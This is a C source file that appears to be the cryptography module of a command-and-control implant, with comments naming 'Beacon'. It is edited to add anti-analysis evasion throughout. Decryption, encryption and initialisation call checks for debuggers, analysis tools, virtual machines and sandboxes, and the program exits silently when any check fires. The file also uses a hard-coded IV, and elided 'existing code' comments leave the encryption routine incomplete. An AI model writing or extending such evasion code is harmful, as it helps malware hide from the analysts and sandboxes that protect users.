#include "security.h"
#include "tomcrypt.h"

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <intrin.h>

// ...existing includes...

// Anti-analysis constants
#define MAX_VM_CHECKS 10
#define ANTI_DEBUG_ENABLED 1
#define ANTI_VM_ENABLED 1
#define ANTI_SANDBOX_ENABLED 1

// Anti-debugging/analysis function declarations
static BOOL IsDebuggerPresentAdvanced();
static BOOL IsVirtualMachine();
static BOOL IsSandboxEnvironment();
static BOOL CheckProcessList();
static BOOL CheckTiming();
static BOOL CheckMemorySize();
static BOOL CheckCPUCores();
static BOOL CheckRegistryArtifacts();
static void AntiAnalysisInit();

// ...existing code up to security_decrypt function...

/* decrypt the specified stuff */
int security_decrypt(char * ciphertext, int length) {
	// Perform anti-analysis checks before decryption
	if (ANTI_DEBUG_ENABLED && IsDebuggerPresentAdvanced()) {
		exit(0);
	}
	
	if (ANTI_VM_ENABLED && IsVirtualMachine()) {
		exit(0);
	}
	
	if (ANTI_SANDBOX_ENABLED && IsSandboxEnvironment()) {
		exit(0);
	}

	// ...existing decryption code...
	int check;
	char * plaintext;
	char unsigned hmac_bytes[HMAC_SIZE];
	char * hmac_sent = NULL;

	datap data;

	/* if you look closely, this is the structure of the decrypted data */
	unsigned int   counter;
	unsigned int   len;
	char *         dptr;
	unsigned long  mac_len = HMAC_SIZE;

	/* sanity check */
	if (length <= HMAC_SIZE)
		return 0;

	/* create a buffer for our plaintext */
	plaintext = (char *)malloc(length - HMAC_SIZE);

	/* another sanity check */
	if ((length % 16) != 0) {
		free(plaintext);
		return 0;
	}

	/* calculate hmac against ciphertext */
	check = hmac_memory(hash, hmac_key, KEY_SIZE, (const unsigned char *)ciphertext, length-HMAC_SIZE, hmac_bytes, &mac_len);
	sanity("hmac_calculate", check);

	/* compare calculated hmac against embedded hmac */
	hmac_sent = ciphertext + length - HMAC_SIZE;
	check = memcmp(hmac_sent, hmac_bytes, HMAC_SIZE);
	if (check != 0) {
		/* this is not a hard failure. Beacon should continue to operate
		   even when this check fails */
		free(plaintext);
		return 0;
	}

	/* truncate to work w/o the HMAC in the ciphertext */
	length -= HMAC_SIZE;

	/* handle our crypto in a product specific way */
	if (scheme == CRYPTO_LICENSED_PRODUCT) {
		/* init our decryption routines */
		check = cbc_start(cipher, iv, key, KEY_SIZE, 0, &in_state);
		sanity("decrypt/cbc_start", check);

		/* decrypt the buffer */
		check = cbc_decrypt((const unsigned char*)ciphertext, (unsigned char*)plaintext, length, &in_state);
		sanity("decrypt/cbc_decrypt", check);

		/* we're done */
		check = cbc_done(&in_state);
		sanity("decrypt/cbc_done", check);
	}
	else if (scheme == CRYPTO_TRIAL_PRODUCT) {
		memcpy(plaintext, ciphertext, length);
	}
	else {
		exit(1);
	}

	/* initialize our data parser */
	data_init(&data, plaintext, length);

	/* check our counter */
	counter = data_int(&data);
	if ((counter + TOLERANCE) <= lastcounter) {
		/* this is not a hard failure. Beacon should continue to operate
		   even when this check fails */
		free(plaintext);

		/* should let the user know, I don't want them complaining */
		post_crypt_replay_error(lastcounter - (counter + TOLERANCE));
		return 0;
	}

	/* extract and use our length */
	len = data_int(&data);
	if (len <= 0 || len > length) {
		exit(0);
		return 0;
	}

	// ...existing code continues...
	/* pull our data, we're going to use it in a moment */
	dptr = data_ptr(&data, len);
	if (dptr == NULL) {
		exit(0);
		return 0;
	}

	memcpy(ciphertext, dptr, len);

	/* to prevent replay attacks, let's store our last recv'd counter value */
	lastcounter = counter;

	/* cleanup our temporary memory */
	data_cleanup(&data);

	/* free our plaintext */
	free(plaintext);

	return len;
}

/* post a frame to our socket OK OK */
int security_encrypt(char * ciphertext, int length) {
	// Random anti-analysis check during encryption
	static int check_counter = 0;
	if (++check_counter % 5 == 0) {
		if (CheckTiming()) {
			exit(0);
		}
	}

	// ...existing encryption code...
	int pad, check;
	unsigned long mac_len = HMAC_SIZE;

	pad = length % 16;
	// ...rest of existing code...
}

void security_init(char * k) {
	// Initialize anti-analysis systems first
	AntiAnalysisInit();
	
	// ...existing security_init code...
	int check;
	unsigned char key_bucket[KEY_SIZE*2];
	unsigned long hash_len = HASH_SIZE;

	/* setup hash function */
	register_hash(&sha256_desc);
	hash = find_hash("sha256");

	/* hash the key to generate keymaterial */
	check = hash_memory(hash, (const unsigned char*)k, KEY_SIZE, key_bucket, &hash_len);
	sanity("crypt_derive", check);

	/* Copy keys out */
	memcpy(key, &key_bucket[0], KEY_SIZE);
	memcpy(hmac_key, &key_bucket[KEY_SIZE], KEY_SIZE);

	/* setup our IV */
	memcpy(iv, "abcdefghijklmnop", 16);

	/* setup our AES cipher */
	register_cipher(&aes_desc);
	cipher = find_cipher("aes");

	check = aes_setup(key, KEY_SIZE, 0, &the_key);
	sanity("aes_setup", check);
}

// Anti-analysis implementation functions
static void AntiAnalysisInit() {
	// Perform initial comprehensive checks
	if (ANTI_DEBUG_ENABLED && IsDebuggerPresentAdvanced()) {
		exit(0);
	}
	
	if (ANTI_VM_ENABLED && IsVirtualMachine()) {
		exit(0);
	}
	
	if (ANTI_SANDBOX_ENABLED && IsSandboxEnvironment()) {
		exit(0);
	}
}

static BOOL IsDebuggerPresentAdvanced() {
	// Standard IsDebuggerPresent check
	if (IsDebuggerPresent()) {
		return TRUE;
	}
	
	// PEB check for BeingDebugged flag
	__try {
		PPEB pPEB = (PPEB)__readgsqword(0x60);
		if (pPEB && pPEB->BeingDebugged) {
			return TRUE;
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER) {
		// If we can't access PEB, assume debugger
		return TRUE;
	}
	
	// Check for remote debugger
	BOOL bDebuggerPresent = FALSE;
	if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent) {
		return TRUE;
	}
	
	// NtQueryInformationProcess check
	HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
	if (hNtDll) {
		typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
		pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
		
		if (NtQueryInformationProcess) {
			DWORD_PTR dwProcessDebugPort = 0;
			NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)7, &dwProcessDebugPort, sizeof(dwProcessDebugPort), NULL);
			if (status == 0 && dwProcessDebugPort != 0) {
				return TRUE;
			}
		}
	}
	
	return CheckProcessList();
}

static BOOL CheckProcessList() {
	const char* debuggers[] = {
		"ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "windbg.exe", "idaq.exe", "idaq64.exe",
		"ida.exe", "ida64.exe", "radare2.exe", "ghidra.exe", "cheatengine-x86_64.exe",
		"processhacker.exe", "procexp.exe", "procmon.exe", "wireshark.exe", "fiddler.exe"
	};
	
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if (Process32First(hSnapshot, &pe32)) {
		do {
			for (int i = 0; i < sizeof(debuggers)/sizeof(debuggers[0]); i++) {
				if (_stricmp(pe32.szExeFile, debuggers[i]) == 0) {
					CloseHandle(hSnapshot);
					return TRUE;
				}
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	
	CloseHandle(hSnapshot);
	return FALSE;
}

static BOOL IsVirtualMachine() {
	// Check CPU brand
	int cpuInfo[4];
	__cpuid(cpuInfo, 0);
	char vendor[13];
	memcpy(vendor, &cpuInfo[1], 4);
	memcpy(vendor + 4, &cpuInfo[3], 4);
	memcpy(vendor + 8, &cpuInfo[2], 4);
	vendor[12] = '\0';
	
	// VMware detection
	if (strstr(vendor, "VMware")) return TRUE;
	
	// Registry-based VM detection
	if (CheckRegistryArtifacts()) return TRUE;
	
	// Check for VM-specific services
	SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (hSCM) {
		const char* vmServices[] = {
			"vmtools", "vmmouse", "vmhgfs", "vmci", "vboxservice", "vboxsf", "VBoxGuest"
		};
		
		for (int i = 0; i < sizeof(vmServices)/sizeof(vmServices[0]); i++) {
			SC_HANDLE hService = OpenServiceA(hSCM, vmServices[i], SERVICE_QUERY_STATUS);
			if (hService) {
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCM);
				return TRUE;
			}
		}
		CloseServiceHandle(hSCM);
	}
	
	// Check MAC address for VM indicators
	IP_ADAPTER_INFO* pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
	}
	
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
		IP_ADAPTER_INFO* pAdapter = pAdapterInfo;
		while (pAdapter) {
			// VMware MAC prefixes
			if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x05 && pAdapter->Address[2] == 0x69) ||
				(pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
				(pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56)) {
				free(pAdapterInfo);
				return TRUE;
			}
			pAdapter = pAdapter->Next;
		}
	}
	
	if (pAdapterInfo) free(pAdapterInfo);
	
	return FALSE;
}

static BOOL CheckRegistryArtifacts() {
	HKEY hKey;
	const char* vmRegKeys[] = {
		"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
		"SOFTWARE\\VMware, Inc.\\VMware Tools",
		"SOFTWARE\\Oracle\\VirtualBox Guest Additions"
	};
	
	for (int i = 0; i < sizeof(vmRegKeys)/sizeof(vmRegKeys[0]); i++) {
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmRegKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return TRUE;
		}
	}
	
	return FALSE;
}

static BOOL IsSandboxEnvironment() {
	// Check system uptime (sandboxes often have low uptime)
	DWORD uptime = GetTickCount();
	if (uptime < 300000) { // Less than 5 minutes
		return TRUE;
	}
	
	// Check memory size
	if (CheckMemorySize()) return TRUE;
	
	// Check CPU cores
	if (CheckCPUCores()) return TRUE;
	
	// Check for common sandbox artifacts
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(computerName);
	if (GetComputerNameA(computerName, &size)) {
		const char* sandboxNames[] = {
			"MALWARE", "SANDBOX", "VIRUS", "MALTEST", "CUCKOO", "ANALYSIS"
		};
		
		for (int i = 0; i < sizeof(sandboxNames)/sizeof(sandboxNames[0]); i++) {
			if (strstr(_strupr(computerName), sandboxNames[i])) {
				return TRUE;
			}
		}
	}
	
	// Check for analysis tools in running processes
	return CheckProcessList();
}

static BOOL CheckMemorySize() {
	MEMORYSTATUSEX memInfo;
	memInfo.dwLength = sizeof(MEMORYSTATUSEX);
	
	if (GlobalMemoryStatusEx(&memInfo)) {
		// Less than 2GB RAM suggests VM/sandbox
		if (memInfo.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
			return TRUE;
		}
	}
	
	return FALSE;
}

static BOOL CheckCPUCores() {
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	
	// Single core systems are suspicious
	if (sysInfo.dwNumberOfProcessors < 2) {
		return TRUE;
	}
	
	return FALSE;
}

static BOOL CheckTiming() {
	// Simple timing check to detect analysis
	LARGE_INTEGER start, end, freq;
	
	if (!QueryPerformanceFrequency(&freq) || !QueryPerformanceCounter(&start)) {
		return FALSE;
	}
	
	// Perform some dummy operations
	volatile int dummy = 0;
	for (int i = 0; i < 1000; i++) {
		dummy += i * i;
	}
	
	if (!QueryPerformanceCounter(&end)) {
		return FALSE;
	}
	
	// Calculate elapsed time in microseconds
	double elapsed = ((double)(end.QuadPart - start.QuadPart) * 1000000.0) / freq.QuadPart;
	
	// If execution took too long, we might be under analysis
	if (elapsed > 10000) { // 10ms threshold
		return TRUE;
	}
	
	return FALSE;
}

// ...existing code continues with rsa_encrypt_once, modpow, etc...
